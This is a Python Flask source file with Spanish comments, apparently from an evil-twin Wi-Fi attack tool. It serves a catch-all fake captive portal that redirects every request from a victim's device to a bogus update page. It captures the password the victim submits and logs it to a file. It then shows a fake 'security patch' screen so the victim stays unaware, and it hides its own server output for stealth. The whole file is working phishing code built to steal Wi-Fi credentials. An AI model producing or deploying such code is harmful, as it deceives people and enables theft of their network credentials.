from __future__ import annotations

from flask import Flask, render_template, request
import logging
import sys

# Desactivamos los logs aburridos de Werkzeug/Flask
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# Silenciamos el banner de desarrollo de Flask para mantener el sigilo en la terminal
cli = sys.modules['flask.cli']
cli.show_server_banner = lambda *x: None

app = Flask(__name__)

# Esta ruta "Atrapa-Todo" obliga a que CUALQUIER página que busque
# el dispositivo de la víctima, redirija a tu portal de actualización.


@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def portal_cautivo(path):
    # Servimos el index.html de tu carpeta 'templates'
    return render_template('index.html')


@app.route('/capturar', methods=['POST'])
def capturar():
    password = request.form.get('password')
    if password:
        # Notificación táctica en la terminal del Sentinel
        print(
            f"\n\033[1;32m[!] BOTÍN ASEGURADO: CREDENCIAL CAPTURADA -> {password}\033[0m")
        print(
            "\033[1;33m[>>>] Presiona ENTER para abortar el ataque o espera a otra víctima.\033[0m")

        # Guardamos en la base de datos de capturas local
        with open("capturas_anubis.txt", "a") as f:
            f.write(f"SSID_Engaño | Password: {password}\n")

    # Pantalla final que verá la víctima para no levantar sospechas
    return """
    <div style="font-family: sans-serif; text-align: center; padding: 50px;">
        <h2 style="color: #1a73e8;">Aplicando parche de seguridad...</h2>
        <p>15% completo. Su conexión se restablecerá en breve.</p>
        <p style="color: red; font-size: 12px;">Por favor, no cierre esta ventana.</p>
    </div>
    """


def iniciar_servidor():
    # El use_reloader=False es OBLIGATORIO cuando se corre Flask dentro de un hilo secundario
    app.run(host='0.0.0.0', port=80, use_reloader=False)
